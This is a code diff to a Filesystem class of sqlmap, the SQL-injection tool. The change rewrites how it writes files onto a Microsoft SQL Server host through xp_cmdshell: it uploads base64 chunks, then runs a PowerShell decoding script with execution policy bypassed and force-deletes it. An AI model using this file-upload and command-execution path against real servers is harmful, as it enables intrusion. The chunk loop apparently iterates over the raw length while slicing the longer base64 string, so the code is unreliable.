@@ -169,16 +169,31 @@ class Filesystem(GenericFilesystem):
         infoMsg += "to file '%s'" % dFile
         logger.info(infoMsg)
 
+        encodedFileContent = base64encode(wFileContent)
+        encodedBase64File = "tmpf%s.txt" % randomStr(lowercase=True)
+        encodedBase64FilePath = "%s\%s" % (tmpPath, encodedBase64File)
+
         randPSScript = "tmpf%s.ps1" % randomStr(lowercase=True)
         randPSScriptPath = "%s\%s" % (tmpPath, randPSScript)
 
-        encodedFileContent = base64encode(wFileContent)
-        psString = "$Content = [System.Convert]::FromBase64String(\"%s\"); Set-Content -Path \"%s\" -Value $Content -Encoding Byte" % (encodedFileContent, dFile)
+        wFileSize = len(wFileContent)
+        chunkMaxSize = 1024
 
-        logger.debug("uploading the PowerShell script to %s, please wait.." % randPSScriptPath)
+        logger.debug("uploading the base64-encoded file to %s, please wait.." % encodedBase64FilePath)
+
+        for i in xrange(0, wFileSize, chunkMaxSize):
+            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
+            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)
+
+        #psString = "$Content = [System.Convert]::FromBase64String(\"%s\"); Set-Content -Path \"%s\" -Value $Content -Encoding Byte" % (encodedFileContent, dFile)
+        psString = "$Base64 = Get-Content -Path %s; $Content = " % encodedBase64FilePath
+        psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
+        psString += "-Path %s -Value $Content -Encoding Byte" % dFile
+
+        logger.debug("uploading the PowerShell base64-decoding script to %s, please wait.." % randPSScriptPath)
         self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)
 
-        logger.debug("executing the PowerShell script to write the %s file" % dFile)
+        logger.debug("executing the PowerShell base64-decoding script to write the %s file" % dFile)
 
         commands = ("powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
                     "del /F /Q \"%s\"" % randPSScriptPath)
@@ -207,7 +222,6 @@ class Filesystem(GenericFilesystem):
             complComm = " & ".join(command for command in commands)
 
             self.execCmd(complComm)
-
         else:
             debugMsg = "the file is larger than %d bytes. " % debugSize
             debugMsg += "sqlmap will split it into chunks locally, upload "
@@ -305,7 +319,7 @@ class Filesystem(GenericFilesystem):
         End Function""" % (randFilePath, dFile)
 
         vbs = vbs.replace("    ", "")
-        encodedFileContent = wFileContent.encode("base64")[:-1]
+        encodedFileContent = base64encode(wFileContent)
 
         logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)
 
